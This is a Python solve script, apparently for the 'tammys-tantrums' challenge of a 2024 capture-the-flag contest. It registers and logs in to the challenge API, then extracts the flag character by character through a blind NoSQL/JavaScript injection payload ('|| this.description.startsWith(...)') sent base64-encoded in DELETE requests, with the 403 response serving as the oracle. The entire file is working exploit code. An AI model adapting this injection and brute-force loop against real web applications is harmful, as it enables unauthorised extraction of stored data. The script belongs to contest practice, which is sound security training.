import requests
import base64
import string
import multiprocessing

# host = "http://localhost:3000"

host = "http://tammys-tantrums.chalz.nitectf2024.live"

json_data = {
    'username': '1337',
    'password': "1337",
}
response = requests.post(f'{host}/api/v1/register', json=json_data)
response = requests.post(f'{host}/api/v1/login', json=json_data)

if response.status_code == 200:
    print("Logged in")
cookies = {"token": response.cookies["token"]}


def trial(ch):
    payload = f"""' || this.description.startsWith("{flag}{
        ch}") || '1337' == '"""

    data = base64.b64encode(payload.encode()).decode()
    response = requests.delete(
        f'{host}/api/v1/tantrums/{data}', cookies=cookies)

    # print(response.text)
    # print(f"{flag}{ch}", response.status_code)

    return response.status_code == 403


charset = string.ascii_letters + string.digits + "_{}"

flag = "n"
old_flag = ""

while True:
    with multiprocessing.Pool(len(charset)) as pool:
        for idx, result in enumerate(pool.map(trial, charset)):
            if result:
                flag += charset[idx]

        print(flag)

        if flag == old_flag:
            break
        else:
            old_flag = flag
